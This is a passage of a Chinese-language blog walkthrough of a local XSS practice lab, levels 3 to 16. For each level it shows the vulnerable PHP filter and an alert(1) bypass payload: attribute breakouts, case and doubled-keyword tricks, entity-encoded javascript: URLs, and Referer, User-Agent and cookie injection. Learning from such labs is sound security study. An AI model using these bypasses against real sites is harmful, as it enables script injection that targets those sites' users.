src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173037882.png" alt="image-20240107173037882"><br>看似和2没啥区别 但与level2不同的是，value做了校验，双引号和尖括号都被校验了<br>可以集合单引号和事件来触发</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">‘ onclick=<span class="hljs-string">&#x27;alert(1)</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173047186.png" alt="image-20240107173047186"></p><p><strong>- Pass-4</strong><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173055574.png" alt="image-20240107173055574"><br>可以看到对&lt; &gt;进行了过滤<br>由下图可以看出是双引号包裹得<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173103900.png" alt="image-20240107173103900"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173112017.png" alt="image-20240107173112017"><br><strong>- Pass-5</strong><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173123212.png" alt="image-20240107173123212"><br>对script进行了过滤<br>看了下还是双引号包裹<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173132175.png" alt="image-20240107173132175"><br>过滤了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173141766.png" alt="image-20240107173141766"><br>看手源码<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173149776.png" alt="image-20240107173149776"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;  </span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173201068.png" alt="image-20240107173201068"><br><strong>- Pass-6</strong><br>过滤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><p>可大小写绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173213918.png" alt="image-20240107173213918"><br><strong>- Pass-7</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str =<span class="hljs-built_in">strtolower</span>( $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173223378.png" alt="image-20240107173223378"><br><strong>- Pass-8</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br></code></pre></td></tr></table></figure><p>绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173251577.png" alt="image-20240107173251577"><br><strong>- Pass-9</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br>echo <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span>您的链接不合法？有没有！<span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span><span class="hljs-string">&#x27;.$str7.&#x27;</span><span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="hljs-string">&lt;?php </span><br><span class="hljs-string">echo &quot;</span>&lt;h3 align=center&gt;payload的长度:<span class="hljs-string">&quot;.strlen($str7).&quot;</span>&lt;/h3&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173303276.png" alt="image-20240107173303276"><br><strong>- Pass-10</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br>&lt;?php <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>从代码中可以看到是有几个隐藏参数的如下构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/xss/level10.php?name=1&amp;keyword=1&amp;t_sort=%22type=%22text%22%20onclick=%22alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173311891.png" alt="image-20240107173311891"><br><strong>- Pass-11</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>显然只能从$str11&#x3D;$_SERVER[‘HTTP_REFERER’];入手了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173324529.png" alt="image-20240107173324529"><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173331677.png" alt="image-20240107173331677"><br><strong>- Pass-12</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173340796.png" alt="image-20240107173340796"></p><p>这个就是从user-agent入手</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173350266.png" alt="image-20240107173350266"><br><strong>- Pass-13</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">setcookie</span><span class="hljs-params">(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>)</span></span>;<br><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str00 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>];<br>$str11=$_COOKIE[<span class="hljs-string">&quot;user&quot;</span>];<br>$str22=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11);<br>$str33=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22);<br>echo <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span><span class="hljs-number">.&#x27;</span>&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.$str33.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>cookie注入点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">user= <span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173406124.png" alt="image-20240107173406124"><br><strong>- Pass-14</strong><br>略<br><strong>- Pass-15</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = $_GET[<span class="hljs-string">&quot;src&quot;</span>];<br>echo <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>注入代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&#x27;level1.php?name=&lt;img src=x οnerrοr=alert(1)&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>因为这里要访问上面的angular.min.js这个js文件，才能进行包含，虚拟环境里面无法访问那个js，因为需要fanqiang才能访问<br>ng-include：相当于文件包含。用于包含外部的HTML文件，可以作为一个属性，或者一个元素使用</p><p>onerror:<br>οnerrοr&#x3D;handleErr</p><p>function handleErr(msg,url,l)<br>{<br>&#x2F;&#x2F;Handle the error here<br>return true or false<br>}</p><p><strong>- Pass-16</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str3);<br>$str5=<span 